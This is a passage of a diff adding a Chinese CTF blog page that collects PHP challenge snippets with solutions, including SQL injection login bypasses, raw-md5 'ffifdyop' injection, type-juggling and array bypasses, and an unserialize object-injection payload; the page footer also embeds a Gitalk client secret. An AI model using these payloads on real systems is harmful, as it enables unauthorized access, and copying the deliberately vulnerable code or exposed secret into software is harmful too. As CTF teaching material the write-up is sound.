+        else if (strpos ($_GET[&#39;nctf&#39;], &#39;#biubiubiu&#39;) !== FALSE)   
+            die(&#39;Flag: &#39;.$flag);
+        else
+            echo &#39;骚年，继续努力吧啊~&#39;;
+    }
+ ?&gt;</code></pre><p>也是平台上的一道题</p>
+<h5 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h5><p>两种方法</p>
+<ul>
+<li>法一(我不知道的方法)：<br>按题目要求，既要是数字，又要有<code>#biubiubiu</code>，<code>strpos()</code>要的是字符串，那么传一个数组给他，那么返回NULL，而NULL=false，so it is right。<br>所以<code>?nctf[]=</code></li>
+<li>法二：<br>字符串截断，利用函数<code>ereg()</code>的NULL截断漏洞，绕过正则漏洞。同时要把#编码<br><code>?nctf=1%00%23biubiubiu</code></li>
+</ul>
+<h3 id="15-SQL注入or绕过"><a href="#15-SQL注入or绕过" class="headerlink" title="# 15 SQL注入or绕过"></a># 15 SQL注入or绕过</h3><p><strong>code</strong></p>
+<pre><code>&lt;?php
+#GOAL: login as admin,then get the flag;
+error_reporting(0);
+require &#39;db.inc.php&#39;;
+function clean($str){
+    if(get_magic_quotes_gpc()){ //get_magic_quotes_gpc — 获取当前 magic_quotes_gpc 的配置选项设置
+        $str=stripslashes($str); //返回一个去除转义反斜线后的字符串（\&#39; 转换为 &#39; 等等）。双反斜线（\\）被转换为单个反斜线（\）。
+    }
+    return htmlentities($str, ENT_QUOTES);
+}
+$username = @clean((string)$_GET[&#39;username&#39;]);
+$password = @clean((string)$_GET[&#39;password&#39;]);
+//$query=&#39;SELECT * FROM users WHERE name=\&#39;&#39;admin\&#39;\&#39; AND pass=\&#39;&#39;or 1 #&#39;\&#39;;&#39;;
+$query=&#39;SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;&#39;;
+$result=mysql_query($query);
+if(!$result || mysql_num_rows($result) &lt; 1){
+    die(&#39;Invalid password!&#39;);
+}
+echo $flag;
+?&gt;</code></pre><p>key words:<code>$query=&#39;SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;&#39;;</code></p>
+<h5 id="payload-10"><a href="#payload-10" class="headerlink" title="payload"></a>payload</h5><p><code>?username=admin\&#39;\&#39; AND pass=\&#39;&#39;or 1 #&amp;password=</code></p>
+<h3 id="16密码md5比较绕过"><a href="#16密码md5比较绕过" class="headerlink" title="# 16密码md5比较绕过"></a># 16密码md5比较绕过</h3><p>这个有点没看懂，先记着。<br><strong>code</strong></p>
+<pre><code>&lt;?php
+if($_POST[user] &amp;&amp; $_POST[pass]) {
+   mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
+  mysql_select_db(SAE_MYSQL_DB);
+  $user = $_POST[user];
+  $pass = md5($_POST[pass]);
+  $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&#39; $user &#39;&quot;));
+  if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) {
+    //strcasecmp:0 - 如果两个字符串相等
+      echo &quot;&lt;p&gt;Logged in! Key: flag{**************} &lt;/p&gt;&quot;;
+  }
+  else {
+    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);
+  }
+}
+?&gt;</code></pre><h5 id="payload-11"><a href="#payload-11" class="headerlink" title="payload"></a>payload</h5><p>key:<code>//select pw from ctf where user=&#39;&#39;and 0=1 union select  &#39;e10adc3949ba59abbe56e057f20f883e&#39; #</code></p>
+<p><code>?user=&#39;and 0=1 union select  &#39;e10adc3949ba59abbe56e057f20f883e&#39; #&amp;pass=123456</code></p>
+<h3 id="17-md5-函数-使用数组绕过"><a href="#17-md5-函数-使用数组绕过" class="headerlink" title="# 17 md5()函数===使用数组绕过"></a># 17 md5()函数===使用数组绕过</h3><p><strong>code</strong></p>
+<pre><code>&lt;?php
+error_reporting(0);
+$flag = &#39;flag{test}&#39;;
+if (isset($_GET[&#39;username&#39;]) and isset($_GET[&#39;password&#39;])) {
+    if ($_GET[&#39;username&#39;] == $_GET[&#39;password&#39;])
+        print &#39;Your password can not be your username.&#39;;
+    else if (md5($_GET[&#39;username&#39;]) === md5($_GET[&#39;password&#39;]))
+        die(&#39;Flag: &#39;.$flag);
+    else
+        print &#39;Invalid password&#39;;
+}
+?&gt;</code></pre><h5 id="payload-12"><a href="#payload-12" class="headerlink" title="payload"></a>payload</h5><p>以前遇到过<code>md5($_GET[&#39;username&#39;]) == md5($_GET[&#39;password&#39;])</code><br>则可以构造：<br><code>?username=QNKCDZO&amp;password=240610708</code><br>因为==对比的时候会进行数据转换，<code>0eXXXXXXXXXX</code>转成0了<br>也可以使用数组绕过<br><code>?username[]=1&amp;password[]=2</code><br>但这里是<code>===</code>，只能用数组绕过，PHP对数组进行hash计算都会得出null的空值<br><code>?username[]=1&amp;password[]=2</code></p>
+<h3 id="18-十六进制与数字比较"><a href="#18-十六进制与数字比较" class="headerlink" title="# 18 十六进制与数字比较"></a># 18 十六进制与数字比较</h3><p><strong>code</strong></p>
+<pre><code>&lt;?php
+error_reporting(0);
+function noother_says_correct($temp)
+{
+    $flag = &#39;flag{test}&#39;;
+    $one = ord(&#39;1&#39;);  //ord — 返回字符的 ASCII 码值
+    $nine = ord(&#39;9&#39;); //ord — 返回字符的 ASCII 码值
+    $number = &#39;3735929054&#39;;
+    // Check all the input characters!
+    for ($i = 0; $i &lt; strlen($number); $i++)
+    {
+        // Disallow all the digits!
+        $digit = ord($temp{$i});
+        if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )
+        {
+            // Aha, digit not allowed!
+            return &quot;flase&quot;;
+        }
+    }
+    if($number == $temp)
+        return $flag;
+}
+$temp = $_GET[&#39;password&#39;];
+echo noother_says_correct($temp);
+?&gt;</code></pre><h5 id="payload-13"><a href="#payload-13" class="headerlink" title="payload"></a>payload</h5><p>将3735929054转为16进制<br>结果为：deadc0de<br>在开头加上0x，代表这个是16进制的数字，然后再和十进制的 3735929054比较，答案当然是相同的，返回true拿到flag<br><code>?password=0xdeadc0de</code></p>
+<h3 id="19-数字验证正则绕过"><a href="#19-数字验证正则绕过" class="headerlink" title="# 19 数字验证正则绕过"></a># 19 数字验证正则绕过</h3><p>新玩意儿，从没见过。了解一下new! new! new!<br><strong>code</strong></p>
+<pre><code>&lt;?php
+error_reporting(0);
+$flag = &#39;flag{test}&#39;;
+if  (&quot;POST&quot; == $_SERVER[&#39;REQUEST_METHOD&#39;])
+{
+    $password = $_POST[&#39;password&#39;];
+    if (0 &gt;= preg_match(&#39;/^[[:graph:]]{12,}$/&#39;, $password)) //preg_match — 执行一个正则表达式匹配
+    {
+        echo &#39;Wrong Format&#39;;
+        exit;
+    }
+    while (TRUE)
+    {
+        $reg = &#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#39;;
+        if (6 &gt; preg_match_all($reg, $password, $arr))
+            break;
+        $c = 0;
+        $ps = array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字  [[:upper:]] 任何大写字母  [[:lower:]] 任何小写字母
+        foreach ($ps as $pt)
+        {
+            if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))
+                $c += 1;
+        }
+        if ($c &lt; 3) break;
+        //&gt;=3，必须包含四种类型三种与三种以上
+        if (&quot;42&quot; == $password) echo $flag;
+        else echo &#39;Wrong password&#39;;
+        exit;
+    }
+}
+?&gt;</code></pre><p>分析一波：<code>0 &gt;= preg_match(&#39;/^[[:graph:]]{12,}$/&#39;, $password)</code>意思是要12个字符以上（非空格非TAB之外的内容）</p>
+<pre><code>$reg = &#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#39;;
+if (6 &gt; preg_match_all($reg, $password, $arr))</code></pre><p>匹配到的次数要&gt;6</p>
+<pre><code>$ps = array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字  [[:upper:]] 任何大写字母  [[:lower:]] 任何小写字母
+foreach ($ps as $pt)
+{
+    if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))
+        $c += 1;
+}
+if ($c &lt; 3) break;</code></pre><p>要有大小写字符，数字，字符内容三种与三种以上</p>
+<h5 id="payload-14"><a href="#payload-14" class="headerlink" title="payload"></a>payload</h5><pre><code>42.00e+00000000000
+或
+420.000000000e-1</code></pre><h3 id="20-弱类型整数大小比较绕过"><a href="#20-弱类型整数大小比较绕过" class="headerlink" title="# 20 弱类型整数大小比较绕过"></a># 20 弱类型整数大小比较绕过</h3><p>烦，弱类型怎么那么多。嘤！<br><strong>code</strong></p>
+<pre><code>&lt;?php
+error_reporting(0);
+$flag = &quot;flag{test}&quot;;
+$temp = $_GET[&#39;password&#39;];
+is_numeric($temp)?die(&quot;no numeric&quot;):NULL;    
+if($temp&gt;1336){
+    echo $flag;
+}
+?&gt;</code></pre><p><code>is_numeric($temp)?die(&quot;no numeric&quot;):NULL;</code><br>不能是数字,但是又要&gt;1336</p>
+<h5 id="payload-15"><a href="#payload-15" class="headerlink" title="payload"></a>payload</h5><p><code>?password=1337a</code></p>
+<h3 id="21-md5-true-绕过注入"><a href="#21-md5-true-绕过注入" class="headerlink" title="# 21 md5()true 绕过注入"></a># 21 md5()true 绕过注入</h3><p><strong>code</strong></p>
+<pre><code>&lt;?php
+error_reporting(0);
+$link = mysql_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;);
+if (!$link) {
+  die(&#39;Could not connect to MySQL: &#39; . mysql_error());
+}
+// 选择数据库
+$db = mysql_select_db(&quot;security&quot;, $link);
+if(!$db)
+{
+  echo &#39;select db error&#39;;
+  exit();
+}
+// 执行sql
+$password = $_GET[&#39;password&#39;];
+$sql = &quot;SELECT * FROM users WHERE password = &#39;&quot;.md5($password,true).&quot;&#39;&quot;;
+var_dump($sql);
+// SELECT * FROM users WHERE password = &#39;276f722736c95d99e921722cf9ed621c&#39;
+$result=mysql_query($sql) or die(&#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; );
+$row1 = mysql_fetch_row($result);
+var_dump($row1);
+mysql_close($link);
+?&gt;</code></pre><p><code>$sql = &quot;SELECT * FROM users WHERE password = &#39;&quot;.md5($password,true).&quot;&#39;&quot;;</code><br>md5($password,true)<br>将md5后的hex转换成字符串</p>
+<p>如果包含<code>&#39;or&#39;xxx</code>这样的字符串，那整个sql变成</p>
+<p><code>SELECT * FROM admin WHERE pass = &#39;&#39;or&#39;xxx&#39;</code>就绕过了</p>
+<p>字符串：ffifdyop</p>
+<p>md5后，<code>276f722736c95d99e921722cf9ed621c</code><br>hex转换成字符串：<code>&#39;or&#39;6&lt;trash&gt;</code></p>
+<h5 id="payload-16"><a href="#payload-16" class="headerlink" title="payload"></a>payload</h5><p><code>?password=ffifdyop</code></p>
+<h3 id="22-switch没有-break-字符与0比较绕过"><a href="#22-switch没有-break-字符与0比较绕过" class="headerlink" title="# 22  switch没有 break 字符与0比较绕过"></a># 22  switch没有 break 字符与0比较绕过</h3><p><strong>code</strong></p>
+<pre><code>&lt;?php
+// error_reporting(0);
+if (isset($_GET[&#39;which&#39;]))
+{
+    $which = $_GET[&#39;which&#39;];
+    switch ($which)
+    {
+    case 0:
+    print(&#39;arg&#39;);
+    // break;
+    case 1:
+    case 2:
+        require_once $which.&#39;.php&#39;;
+         echo $flag;
+        break;
+    default:
+        echo GWF_HTML::error(&#39;PHP-0817&#39;, &#39;Hacker NoNoNo!&#39;, false);
+        break;
+    }
+}
+?&gt;</code></pre><p>here:<br>让我们包含当前目录中的<code>flag.php</code>，给which为flag，这里会发现在case 0和case 1的时候，没有break，按照常规思维，应该是0比较不成功，进入比较1，然后比较2，再然后进入default，但是事实却不是这样，事实上，在 case 0的时候，字符串和0比较是相等的，进入了case 0的方法体，但是却没有break，这个时候，默认判断已经比较成功了，而如果匹配成功之后，会继续执行后面的语句，这个时候，是不会再继续进行任何判断的。也就是说，我们which传入flag的时候，case 0比较进入了方法体，但是没有break，默认已经匹配成功，往下执行不再判断，进入2的时候，执行了<code>require_once flag.php</code></p>
+<h5 id="payload-17"><a href="#payload-17" class="headerlink" title="payload"></a>payload</h5><p><code>?which=flag</code></p>
+<h3 id="23-unserialize"><a href="#23-unserialize" class="headerlink" title="# 23 unserialize()"></a># 23 unserialize()</h3><p>刚刚学了一点序列化知识就看到这个<br><strong>code</strong></p>
+<pre><code>&lt;?php
+    require_once(&#39;shield.php&#39;);
+    $x = new Shield();
+    isset($_GET[&#39;class&#39;]) &amp;&amp; $g = $_GET[&#39;class&#39;];
+    if (!empty($g)) {
+        $x = unserialize($g);
+    }
+    echo $x-&gt;readfile();
+?&gt;
+&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt;
+&lt;!-- shield.php --&gt;
+&lt;?php
+    //flag is in pctf.php
+    class Shield {
+        public $file;
+        function __construct($filename = &#39;&#39;) {
+            $this -&gt; file = $filename;
+        }
+
+        function readfile() {
+            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE  
+            &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) {
+                return @file_get_contents($this-&gt;file);
+            }
+        }
+    }
+?&gt;
+&lt;!-- showimg.php --&gt;
+&lt;?php
+    $f = $_GET[&#39;img&#39;];
+    if (!empty($f)) {
+        $f = base64_decode($f);
+        if (stripos($f,&#39;..&#39;)===FALSE &amp;&amp; stripos($f,&#39;/&#39;)===FALSE &amp;&amp; stripos($f,&#39;\\&#39;)===FALSE
+        //stripos — 查找字符串首次出现的位置（不区分大小写）
+        &amp;&amp; stripos($f,&#39;pctf&#39;)===FALSE) {
+            readfile($f);
+        } else {
+            echo &quot;File not found!&quot;;
+        }
+    }
+?&gt;</code></pre><p>说明：flag在<code>pctf.php</code>，但<code>showimg.php</code>中不允许直接读取<code>pctf.php</code>，只有在<code>index.php</code>中可以传入变量class<br>，index.php中Shield类的实例<code>$X = unserialize($g)</code>，<code>$g = $_GET[&#39;class&#39;];</code>，<code>$X</code>中不知<code>$filename</code>变量，但需要找的是：<code>$filename = &quot;pctf.php&quot;</code>，现$X已知，求传入的class变量值。<br>可以进行序列化操作：</p>
+<pre><code>&lt;?php
+require_once(&#39;shield.php&#39;);
+$x = class Shield();
+$g = serialize($x);
+echo $g;
+?&gt;
+&lt;!-- shield.php --&gt;
+&lt;?php
+    //flag is in pctf.php
+    class Shield {
+        public $file;
+        function __construct($filename = &#39;pctf.php&#39;) {
+            $this -&gt; file = $filename;
+        }
+
+        function readfile() {
+            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE  
+            &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) {
+                return @file_get_contents($this-&gt;file);
+            }
+        }
+    }
+?&gt;</code></pre><p>得到<code>O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></p>
+<h5 id="payload-18"><a href="#payload-18" class="headerlink" title="payload"></a>payload</h5><p><code>?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></p>
+<h4 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h4><p><a href="https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">CTF中常见PHP特性学习笔记</a></p>
+
+  </article>
+  
+    
+<div class="nexmoe-post-copyright">
+<i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+<strong>本文作者：</strong>Gsuhy<br>
+<strong>本文链接：</strong><a href="https://www.Gsuhy.cn/2018/03/18/CTF中一些PHP问题小结/" title="https://www.Gsuhy.cn/2018/03/18/CTF中一些PHP问题小结/" target="_blank" rel="noopener">https://www.Gsuhy.cn/2018/03/18/CTF中一些PHP问题小结/</a><br>
+
+  <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+
+</div>
+
+
+  
+  <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '80b2453b6d5f37ad6225',
+        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
+        id: window.location.pathname,
+        repo: 'nexmoe.github.io',
+        owner: 'nexmoe',
+        admin: 'nexmoe'
+    })
+    gitalk.render('gitalk')
+</script>
+</section>
+</div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+ 
+    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+ 
+    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script src="/js/app.js?v=1566894167613"></script>
+<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
+
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xtaodada/xtaodada.github.io@0.0.2/copy.js"></script>
+
+  
+
+
+
+
+
+</body>
+
+</html>
